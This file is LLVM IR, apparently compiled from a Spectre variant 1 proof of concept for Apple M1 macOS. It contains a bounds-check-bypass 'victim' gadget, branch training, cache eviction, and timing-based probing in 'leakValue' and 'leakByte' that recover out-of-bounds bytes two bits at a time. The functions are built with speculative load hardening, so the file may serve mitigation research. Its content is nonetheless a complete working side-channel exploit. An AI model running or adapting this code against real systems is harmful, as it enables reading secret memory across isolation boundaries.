; ModuleID = 'spectre.c'
source_filename = "spectre.c"
target datalayout = "e-m:o-i64:64-i128:128-n32:64-S128"
target triple = "arm64-apple-macosx12.0.0"

@array1 = global ptr null, align 8
@array2 = global ptr null, align 8
@array_size = global ptr null, align 8
@array2_ctx = global ptr null, align 8
@__stderrp = external global ptr, align 8
@.str = private unnamed_addr constant [62 x i8] c"malloc of array2 with size %d failed (%d entries of size %d)\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"malloc of array1 with size %zu failed\0A\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"malloc of array_size with size %zu failed\0A\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"malloc of array2_ctx with size %zu failed\0A\00", align 1
@training_offset = global i64 0, align 8
@leakValue.cache_hits = internal global [4 x i32] zeroinitializer, align 4
@timestamp = external global i64, align 8
@llvm.used = appending global [1 x ptr] [ptr @victim], section "llvm.metadata"

; Function Attrs: noinline nounwind speculative_load_hardening ssp uwtable(sync)
define void @victim(i64 noundef %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i64, align 8
  store i64 %0, ptr %2, align 8
  %5 = load i64, ptr %2, align 8
  %6 = urem i64 %5, 4
  %7 = mul i64 %6, 2
  %8 = trunc i64 %7 to i32
  store i32 %8, ptr %3, align 4
  %9 = load i64, ptr %2, align 8
  %10 = udiv i64 %9, 4
  store i64 %10, ptr %4, align 8
  %11 = load i64, ptr %4, align 8
  %12 = load ptr, ptr @array_size, align 8
  %13 = load i64, ptr %12, align 8
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %28

15:                                               ; preds = %1
  %16 = load ptr, ptr @array2, align 8
  %17 = load ptr, ptr @array1, align 8
  %18 = load i64, ptr %4, align 8
  %19 = getelementptr inbounds i8, ptr %17, i64 %18
  %20 = load i8, ptr %19, align 1
  %21 = sext i8 %20 to i32
  %22 = load i32, ptr %3, align 4
  %23 = ashr i32 %21, %22
  %24 = and i32 %23, 3
  %25 = mul nsw i32 %24, 512
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, ptr %16, i64 %26
  call void asm sideeffect "LDR x10, [$0]", "r,~{x10},~{memory}"(ptr %27) #5, !srcloc !6
  br label %28

28:                                               ; preds = %15, %1
  ret void
}

; Function Attrs: noinline nounwind speculative_load_hardening ssp uwtable(sync)
define i32 @setup(ptr noundef %0, ptr noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca ptr, align 8
  %5 = alloca ptr, align 8
  %6 = alloca i32, align 4
  store ptr %0, ptr %4, align 8
  store ptr %1, ptr %5, align 8
  %7 = load ptr, ptr @array1, align 8
  %8 = icmp ne ptr %7, null
  br i1 %8, label %9, label %11

9:                                                ; preds = %2
  %10 = load ptr, ptr @array1, align 8
  call void @free(ptr noundef %10)
  br label %11

11:                                               ; preds = %9, %2
  %12 = load ptr, ptr @array2, align 8
  %13 = icmp ne ptr %12, null
  br i1 %13, label %16, label %14

14:                                               ; preds = %11
  %15 = call ptr @malloc(i64 noundef 2048) #6
  store ptr %15, ptr @array2, align 8
  br label %16

16:                                               ; preds = %14, %11
  %17 = load ptr, ptr @array2, align 8
  %18 = icmp ne ptr %17, null
  br i1 %18, label %22, label %19

19:                                               ; preds = %16
  %20 = load ptr, ptr @__stderrp, align 8
  %21 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %20, ptr noundef @.str, i32 noundef 2048, i32 noundef 4, i32 noundef 512)
  store i32 1, ptr %3, align 4
  br label %117

22:                                               ; preds = %16
  %23 = load ptr, ptr %4, align 8
  %24 = call i64 @strlen(ptr noundef %23)
  %25 = add i64 %24, 1
  %26 = load ptr, ptr %5, align 8
  %27 = call i64 @strlen(ptr noundef %26)
  %28 = add i64 %25, %27
  %29 = add i64 %28, 1
  %30 = call ptr @malloc(i64 noundef %29) #6
  store ptr %30, ptr @array1, align 8
  %31 = load ptr, ptr @array1, align 8
  %32 = icmp ne ptr %31, null
  br i1 %32, label %43, label %33

33:                                               ; preds = %22
  %34 = load ptr, ptr @__stderrp, align 8
  %35 = load ptr, ptr %4, align 8
  %36 = call i64 @strlen(ptr noundef %35)
  %37 = load ptr, ptr %5, align 8
  %38 = call i64 @strlen(ptr noundef %37)
  %39 = add i64 %36, %38
  %40 = add i64 %39, 2
  %41 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %34, ptr noundef @.str.1, i64 noundef %40)
  %42 = load ptr, ptr @array2, align 8
  call void @free(ptr noundef %42)
  store ptr null, ptr @array2, align 8
  store i32 1, ptr %3, align 4
  br label %117

43:                                               ; preds = %22
  %44 = load ptr, ptr @array_size, align 8
  %45 = icmp ne ptr %44, null
  br i1 %45, label %56, label %46

46:                                               ; preds = %43
  %47 = call ptr @malloc(i64 noundef 8) #6
  store ptr %47, ptr @array_size, align 8
  %48 = load ptr, ptr @array_size, align 8
  %49 = icmp ne ptr %48, null
  br i1 %49, label %55, label %50

50:                                               ; preds = %46
  %51 = load ptr, ptr @__stderrp, align 8
  %52 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %51, ptr noundef @.str.2, i64 noundef 8)
  %53 = load ptr, ptr @array2, align 8
  call void @free(ptr noundef %53)
  store ptr null, ptr @array2, align 8
  %54 = load ptr, ptr @array1, align 8
  call void @free(ptr noundef %54)
  store ptr null, ptr @array1, align 8
  store i32 1, ptr %3, align 4
  br label %117

55:                                               ; preds = %46
  br label %56

56:                                               ; preds = %55, %43
  %57 = load ptr, ptr %4, align 8
  %58 = call i64 @strlen(ptr noundef %57)
  %59 = add i64 %58, 1
  %60 = load ptr, ptr @array_size, align 8
  store i64 %59, ptr %60, align 8
  %61 = load ptr, ptr @array1, align 8
  %62 = load ptr, ptr %4, align 8
  %63 = load ptr, ptr @array1, align 8
  %64 = call i64 @llvm.objectsize.i64.p0(ptr %63, i1 false, i1 true, i1 false)
  %65 = call ptr @__strcpy_chk(ptr noundef %61, ptr noundef %62, i64 noundef %64) #5
  %66 = load ptr, ptr @array1, align 8
  %67 = load ptr, ptr @array_size, align 8
  %68 = load i64, ptr %67, align 8
  %69 = getelementptr inbounds i8, ptr %66, i64 %68
  %70 = load ptr, ptr %5, align 8
  %71 = load ptr, ptr @array1, align 8
  %72 = load ptr, ptr @array_size, align 8
  %73 = load i64, ptr %72, align 8
  %74 = getelementptr inbounds i8, ptr %71, i64 %73
  %75 = call i64 @llvm.objectsize.i64.p0(ptr %74, i1 false, i1 true, i1 false)
  %76 = call ptr @__strcpy_chk(ptr noundef %69, ptr noundef %70, i64 noundef %75) #5
  %77 = load ptr, ptr @array2_ctx, align 8
  %78 = icmp ne ptr %77, null
  br i1 %78, label %112, label %79

79:                                               ; preds = %56
  %80 = call ptr @malloc(i64 noundef 40) #6
  store ptr %80, ptr @array2_ctx, align 8
  %81 = load ptr, ptr @array2_ctx, align 8
  %82 = icmp ne ptr %81, null
  br i1 %82, label %89, label %83

83:                                               ; preds = %79
  %84 = load ptr, ptr @__stderrp, align 8
  %85 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %84, ptr noundef @.str.3, i64 noundef 40)
  %86 = load ptr, ptr @array2, align 8
  call void @free(ptr noundef %86)
  store ptr null, ptr @array2, align 8
  %87 = load ptr, ptr @array1, align 8
  call void @free(ptr noundef %87)
  store ptr null, ptr @array1, align 8
  %88 = load ptr, ptr @array_size, align 8
  call void @free(ptr noundef %88)
  store ptr null, ptr @array_size, align 8
  store i32 1, ptr %3, align 4
  br label %117

89:                                               ; preds = %79
  store i32 0, ptr %6, align 4
  br label %90

90:                                               ; preds = %104, %89
  %91 = load i32, ptr %6, align 4
  %92 = icmp slt i32 %91, 4
  br i1 %92, label %93, label %107

93:                                               ; preds = %90
  %94 = load ptr, ptr @array2, align 8
  %95 = load i32, ptr %6, align 4
  %96 = mul nsw i32 %95, 512
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, ptr %94, i64 %97
  %99 = call ptr @cache_remove_prepare(ptr noundef %98)
  %100 = load ptr, ptr @array2_ctx, align 8
  %101 = load i32, ptr %6, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds ptr, ptr %100, i64 %102
  store ptr %99, ptr %103, align 8
  br label %104

104:                                              ; preds = %93
  %105 = load i32, ptr %6, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, ptr %6, align 4
  br label %90, !llvm.loop !7

107:                                              ; preds = %90
  %108 = load ptr, ptr @array_size, align 8
  %109 = call ptr @cache_remove_prepare(ptr noundef %108)
  %110 = load ptr, ptr @array2_ctx, align 8
  %111 = getelementptr inbounds ptr, ptr %110, i64 4
  store ptr %109, ptr %111, align 8
  br label %112

112:                                              ; preds = %107, %56
  %113 = load ptr, ptr @array_size, align 8
  %114 = load i64, ptr %113, align 8
  %115 = sub i64 %114, 1
  %116 = mul i64 %115, 4
  store i64 %116, ptr @training_offset, align 8
  store i32 0, ptr %3, align 4
  br label %117

117:                                              ; preds = %112, %83, %50, %33, %19
  %118 = load i32, ptr %3, align 4
  ret i32 %118
}

; Function Attrs: speculative_load_hardening
declare void @free(ptr noundef) #1

; Function Attrs: speculative_load_hardening allocsize(0)
declare ptr @malloc(i64 noundef) #2

; Function Attrs: speculative_load_hardening
declare i32 @fprintf(ptr noundef, ptr noundef, ...) #1

; Function Attrs: speculative_load_hardening
declare i64 @strlen(ptr noundef) #1

; Function Attrs: nounwind speculative_load_hardening
declare ptr @__strcpy_chk(ptr noundef, ptr noundef, i64 noundef) #3

; Function Attrs: nocallback nofree nosync nounwind speculatable willreturn memory(none)
declare i64 @llvm.objectsize.i64.p0(ptr, i1 immarg, i1 immarg, i1 immarg) #4

; Function Attrs: speculative_load_hardening
declare ptr @cache_remove_prepare(ptr noundef) #1

; Function Attrs: noinline nounwind speculative_load_hardening ssp uwtable(sync)
define i32 @leakValue(i64 noundef %0) #0 {
  %2 = alloca ptr, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i64 %0, ptr %5, align 8
  store i32 0, ptr %6, align 4
  br label %16

16:                                               ; preds = %23, %1
  %17 = load i32, ptr %6, align 4
  %18 = icmp slt i32 %17, 4
  br i1 %18, label %19, label %26

19:                                               ; preds = %16
  %20 = load i32, ptr %6, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4 x i32], ptr @leakValue.cache_hits, i64 0, i64 %21
  store i32 0, ptr %22, align 4
  br label %23

23:                                               ; preds = %19
  %24 = load i32, ptr %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, ptr %6, align 4
  br label %16, !llvm.loop !9

26:                                               ; preds = %16
  store i32 0, ptr %7, align 4
  br label %27

27:                                               ; preds = %100, %26
  %28 = load i32, ptr %7, align 4
  %29 = icmp slt i32 %28, 4
  br i1 %29, label %30, label %103

30:                                               ; preds = %27
  store i32 0, ptr %8, align 4
  br label %31

31:                                               ; preds = %40, %30
  %32 = load i32, ptr %8, align 4
  %33 = icmp slt i32 %32, 4
  br i1 %33, label %34, label %43

34:                                               ; preds = %31
  %35 = load ptr, ptr @array2_ctx, align 8
  %36 = load i32, ptr %8, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds ptr, ptr %35, i64 %37
  %39 = load ptr, ptr %38, align 8
  call void @cache_remove(ptr noundef %39)
  br label %40

40:                                               ; preds = %34
  %41 = load i32, ptr %8, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, ptr %8, align 4
  br label %31, !llvm.loop !10

43:                                               ; preds = %31
  call void asm sideeffect "DMB SY\0AISB SY", "~{memory}"() #5, !srcloc !11
  store i32 40, ptr %9, align 4
  br label %44

44:                                               ; preds = %64, %43
  %45 = load i32, ptr %9, align 4
  %46 = icmp sge i32 %45, 0
  br i1 %46, label %47, label %67

47:                                               ; preds = %44
  %48 = load i32, ptr %9, align 4
  %49 = srem i32 %48, 10
  %50 = icmp ne i32 %49, 0
  %51 = xor i1 %50, true
  %52 = zext i1 %51 to i32
  %53 = sext i32 %52 to i64
  %54 = load i64, ptr %5, align 8
  %55 = load i64, ptr @training_offset, align 8
  %56 = sub i64 %54, %55
  %57 = mul i64 %53, %56
  %58 = load i64, ptr @training_offset, align 8
  %59 = add i64 %57, %58
  store i64 %59, ptr %10, align 8
  %60 = load ptr, ptr @array2_ctx, align 8
  %61 = getelementptr inbounds ptr, ptr %60, i64 4
  %62 = load ptr, ptr %61, align 8
  call void @cache_remove(ptr noundef %62)
  %63 = load i64, ptr %10, align 8
  call void @victim(i64 noundef %63)
  br label %64

64:                                               ; preds = %47
  %65 = load i32, ptr %9, align 4
  %66 = add nsw i32 %65, -1
  store i32 %66, ptr %9, align 4
  br label %44, !llvm.loop !12

67:                                               ; preds = %44
  store i32 0, ptr %12, align 4
  br label %68

68:                                               ; preds = %96, %67
  %69 = load i32, ptr %12, align 4
  %70 = icmp slt i32 %69, 4
  br i1 %70, label %71, label %99

71:                                               ; preds = %68
  %72 = load ptr, ptr @array2, align 8
  %73 = load i32, ptr %12, align 4
  %74 = mul nsw i32 %73, 512
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, ptr %72, i64 %75
  store ptr %76, ptr %2, align 8
  call void asm sideeffect "DMB SY\0AISB SY", "~{memory}"() #5, !srcloc !13
  %77 = load i64, ptr @timestamp, align 8
  store i64 %77, ptr %3, align 8
  call void asm sideeffect "DMB SY\0AISB SY", "~{memory}"() #5, !srcloc !14
  %78 = load ptr, ptr %2, align 8
  call void asm sideeffect "LDR x10, [$0]", "r,~{x10},~{memory}"(ptr %78) #5, !srcloc !15
  call void asm sideeffect "DMB SY\0AISB SY", "~{memory}"() #5, !srcloc !16
  %79 = load i64, ptr @timestamp, align 8
  store i64 %79, ptr %4, align 8
  call void asm sideeffect "DMB SY\0AISB SY", "~{memory}"() #5, !srcloc !17
  %80 = load i64, ptr %4, align 8
  %81 = load i64, ptr %3, align 8
  %82 = sub i64 %80, %81
  store i64 %82, ptr %11, align 8
  %83 = load i64, ptr %11, align 8
  %84 = icmp ult i64 %83, 120
  br i1 %84, label %85, label %88

85:                                               ; preds = %71
  %86 = load i64, ptr %11, align 8
  %87 = icmp ne i64 %86, 0
  br label %88

88:                                               ; preds = %85, %71
  %89 = phi i1 [ false, %71 ], [ %87, %85 ]
  %90 = zext i1 %89 to i32
  %91 = load i32, ptr %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [4 x i32], ptr @leakValue.cache_hits, i64 0, i64 %92
  %94 = load i32, ptr %93, align 4
  %95 = add nsw i32 %94, %90
  store i32 %95, ptr %93, align 4
  br label %96

96:                                               ; preds = %88
  %97 = load i32, ptr %12, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, ptr %12, align 4
  br label %68, !llvm.loop !18

99:                                               ; preds = %68
  br label %100

100:                                              ; preds = %99
  %101 = load i32, ptr %7, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, ptr %7, align 4
  br label %27, !llvm.loop !19

103:                                              ; preds = %27
  store i32 0, ptr %13, align 4
  store i32 0, ptr %14, align 4
  store i32 1, ptr %15, align 4
  br label %104

104:                                              ; preds = %121, %103
  %105 = load i32, ptr %15, align 4
  %106 = icmp slt i32 %105, 4
  br i1 %106, label %107, label %124

107:                                              ; preds = %104
  %108 = load i32, ptr %15, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [4 x i32], ptr @leakValue.cache_hits, i64 0, i64 %109
  %111 = load i32, ptr %110, align 4
  %112 = load i32, ptr %14, align 4
  %113 = icmp sgt i32 %111, %112
  br i1 %113, label %114, label %120

114:                                              ; preds = %107
  %115 = load i32, ptr %15, align 4
  store i32 %115, ptr %13, align 4
  %116 = load i32, ptr %15, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [4 x i32], ptr @leakValue.cache_hits, i64 0, i64 %117
  %119 = load i32, ptr %118, align 4
  store i32 %119, ptr %14, align 4
  br label %120

120:                                              ; preds = %114, %107
  br label %121

121:                                              ; preds = %120
  %122 = load i32, ptr %15, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, ptr %15, align 4
  br label %104, !llvm.loop !20

124:                                              ; preds = %104
  %125 = load i32, ptr %13, align 4
  ret i32 %125
}

; Function Attrs: speculative_load_hardening
declare void @cache_remove(ptr noundef) #1

; Function Attrs: noinline nounwind speculative_load_hardening ssp uwtable(sync)
define i32 @leakByte(i64 noundef %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i64 %0, ptr %2, align 8
  %6 = load i64, ptr %2, align 8
  %7 = mul i64 %6, 4
  store i64 %7, ptr %3, align 8
  store i32 0, ptr %4, align 4
  store i32 3, ptr %5, align 4
  br label %8

8:                                                ; preds = %21, %1
  %9 = load i32, ptr %5, align 4
  %10 = icmp sge i32 %9, 0
  br i1 %10, label %11, label %24

11:                                               ; preds = %8
  %12 = load i32, ptr %4, align 4
  %13 = shl i32 %12, 2
  store i32 %13, ptr %4, align 4
  %14 = load i64, ptr %3, align 8
  %15 = load i32, ptr %5, align 4
  %16 = sext i32 %15 to i64
  %17 = add i64 %14, %16
  %18 = call i32 @leakValue(i64 noundef %17)
  %19 = load i32, ptr %4, align 4
  %20 = or i32 %19, %18
  store i32 %20, ptr %4, align 4
  br label %21

21:                                               ; preds = %11
  %22 = load i32, ptr %5, align 4
  %23 = add nsw i32 %22, -1
  store i32 %23, ptr %5, align 4
  br label %8, !llvm.loop !21

24:                                               ; preds = %8
  %25 = load i32, ptr %4, align 4
  ret i32 %25
}

attributes #0 = { noinline nounwind speculative_load_hardening ssp uwtable(sync) "frame-pointer"="non-leaf" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="apple-m1" "target-features"="+aes,+crc,+dotprod,+fp-armv8,+fp16fml,+fullfp16,+lse,+neon,+ras,+rcpc,+rdm,+sha2,+sha3,+v8.1a,+v8.2a,+v8.3a,+v8.4a,+v8.5a,+v8a,+zcm,+zcz" }
attributes #1 = { speculative_load_hardening "frame-pointer"="non-leaf" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="apple-m1" "target-features"="+aes,+crc,+dotprod,+fp-armv8,+fp16fml,+fullfp16,+lse,+neon,+ras,+rcpc,+rdm,+sha2,+sha3,+v8.1a,+v8.2a,+v8.3a,+v8.4a,+v8.5a,+v8a,+zcm,+zcz" }
attributes #2 = { speculative_load_hardening allocsize(0) "frame-pointer"="non-leaf" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="apple-m1" "target-features"="+aes,+crc,+dotprod,+fp-armv8,+fp16fml,+fullfp16,+lse,+neon,+ras,+rcpc,+rdm,+sha2,+sha3,+v8.1a,+v8.2a,+v8.3a,+v8.4a,+v8.5a,+v8a,+zcm,+zcz" }
attributes #3 = { nounwind speculative_load_hardening "frame-pointer"="non-leaf" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="apple-m1" "target-features"="+aes,+crc,+dotprod,+fp-armv8,+fp16fml,+fullfp16,+lse,+neon,+ras,+rcpc,+rdm,+sha2,+sha3,+v8.1a,+v8.2a,+v8.3a,+v8.4a,+v8.5a,+v8a,+zcm,+zcz" }
attributes #4 = { nocallback nofree nosync nounwind speculatable willreturn memory(none) }
attributes #5 = { nounwind }
attributes #6 = { allocsize(0) }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 2, !"SDK Version", [2 x i32] [i32 13, i32 1]}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 8, !"PIC Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 1}
!5 = !{!"clang version 17.0.6"}
!6 = !{i64 2148378758}
!7 = distinct !{!7, !8}
!8 = !{!"llvm.loop.mustprogress"}
!9 = distinct !{!9, !8}
!10 = distinct !{!10, !8}
!11 = !{i64 2148379674, i64 2148379683}
!12 = distinct !{!12, !8}
!13 = !{i64 2148378148, i64 2148378157}
!14 = !{i64 2148378216, i64 2148378225}
!15 = !{i64 2148378264}
!16 = !{i64 2148378347, i64 2148378356}
!17 = !{i64 2148378413, i64 2148378422}
!18 = distinct !{!18, !8}
!19 = distinct !{!19, !8}
!20 = distinct !{!20, !8}
!21 = distinct !{!21, !8}
